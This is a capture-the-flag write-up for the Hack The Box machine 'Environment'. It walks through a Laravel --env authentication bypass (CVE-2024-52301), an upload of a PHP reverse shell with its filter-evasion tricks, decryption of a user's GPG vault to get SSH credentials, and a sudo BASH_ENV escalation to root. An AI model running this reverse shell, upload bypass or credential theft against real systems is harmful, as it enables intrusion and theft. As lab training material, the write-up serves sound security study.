# HTB Writeup — Environment

**Author:** Mridul
**Difficulty:** Easy/Medium
**Vector:** Laravel Debug Exploit → File Upload RCE → GPG Vault → sudo env bypass → root

---

# 🔍 Step 1: Port Enumeration (Rustscan → Nmap)

Quick sweep with Rustscan:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/environment$ rustscan -a 10.10.11.67
```

Open ports:

* **22/tcp** – SSH
* **80/tcp** – HTTP (nginx)

Fingerprinting with Nmap:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/environment$ nmap -sC -sV -p 22,80 10.10.11.67
```

Reveals:

* SSH: OpenSSH 9.2p1 (Debian)
* Webserver: nginx/1.22.1 hosting **environment.htb**

Add to hosts:

```bash
sudo sh -c 'echo "10.10.11.67 environment.htb" >> /etc/hosts'
```

---

# 🌐 Step 2: Web Enumeration

Directory fuzzing:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/environment$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://environment.htb/FUZZ -fs 169
```

Found:

* `/login`
* `/logout`
* `/mailing`
* `/upload`
* `/up`

While intercepting requests with BurpSuite, we discovered…

# 🚨 Laravel Debug Enabled (BIG oops)

The backend leaked a **Laravel version: 11.30.0** and environment details.

This version is vulnerable to **CVE‑2024‑52301** → allows **authentication bypass** using `--env=` parameter.

By modifying the login POST request:

```
POST /login?--env=preprod HTTP/1.1
...
email=admin@environment.htb&password=admin&remember=True
```

We bypass authentication and land on:

```
/management/dashboard
```

---

# 📁 Step 3: File Upload RCE

We craft a reverse shell:

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1'"); ?>
```

To bypass MIME checks:

* prepend `GIF89a` magic bytes
* rename file to `shell.php.` (tricks storage engine into saving it as `.php`)

Start listener:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/environment$ rlwrap nc -lvnp 4444
```

Upload file → trigger it → **www-data shell obtained**.

---

# 🧾 Step 4: Looting GPG Vault (Privilege Escalation Part 1)

Inside `/home/hish/backup` we find:

* `keyvault.gpg`
* `.gnupg/` folder

Extract the encrypted file:

```bash
cat keyvault.gpg | base64 -w0
```

Decode locally:

```bash
echo "<base64>" | base64 -d > keyvault.gpg
```

Copy `.gnupg` to attacker machine and decrypt:

```bash
gpg --homedir . --list-keys
gpg --homedir . --list-secret-keys
gpg --homedir . --export-secret-keys --armor > private.asc
gpg --import private.asc
gpg --decrypt keyvault.gpg
```

This reveals **SSH credentials for user: hish**.

SSH in:

```bash
ssh hish@10.10.11.67
```

---

# 🛠️ Step 5: Privilege Escalation to Root

Check sudo rights:

```bash
sudo -l
```

Output includes:

```
env_keep += "ENV BASH_ENV"
(ALL) /usr/bin/systeminfo
```

This means we can force sudo to preload **our bash script**.

Create malicious script:

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/environment$ cat > /tmp/root.sh << EOF
#!/bin/bash
/bin/bash
EOF
```

Exploit:

```bash
sudo BASH_ENV=/tmp/root.sh /usr/bin/systeminfo
```

🔥 **Instant root shell.**

---

# 🏁 Final

```
root@environment:~# id
uid=0(root) gid=0(root)
```

Flags collected. Machine pwned.

---

If you'd like, I can:
✅ Add screenshots placeholders
✅ Add attack-chain diagram
✅ Rewrite professionally or casually
✅ Convert to PDF/Markdown export
